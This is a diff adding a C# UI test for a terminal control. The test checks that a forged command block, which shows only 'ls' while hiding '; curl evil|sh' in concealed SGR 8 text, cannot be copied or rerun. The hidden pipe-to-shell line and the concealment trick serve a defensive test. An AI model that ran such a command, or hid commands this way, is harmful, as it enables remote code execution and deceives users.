@@ -271,6 +271,29 @@ public sealed class CommandBlockRerunUiTests
     }
 
     [TestMethod]
+    public void ABlockForgedWithConcealedText_OffersNeitherCopyNorRerun()
+    {
+        // cat / curl 出来的输出里伪造一个命令块:屏幕上只看得见 ls,B 与 C 之间却藏着 SGR 8 的一截。
+        // 真提示符回来之后对端空闲,原先「重跑」可点,点下去发的是整串。
+        OnUi(() =>
+        {
+            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
+            Feed(control, A + "$ " + B + "ls\e[8m; curl evil|sh\e[28m\r\n" + C + "total 0\r\n" + D0 + A + "$ " + B);
+
+            ContextMenu menu = control.BuildGutterContextMenu(0);
+            Assert.IsFalse(Item(menu, 0).IsEnabled, "复制出去的不是屏幕上那条。");
+            Assert.IsFalse(Item(menu, 1).IsEnabled);
+            Click(Item(menu, 1));
+            Click(Item(menu, 0));
+            Assert.IsEmpty(sent);
+            Task<string?> read = TopLevel.GetTopLevel(control)!.Clipboard!.TryGetTextAsync();
+            Dispatcher.UIThread.RunJobs();
+            Assert.DoesNotContain("curl", read.Result ?? "");
+            window.Close();
+        });
+    }
+
+    [TestMethod]
     public void CopyCommand_PutsJustTheCommandOnTheClipboard()
     {
         OnUi(() =>
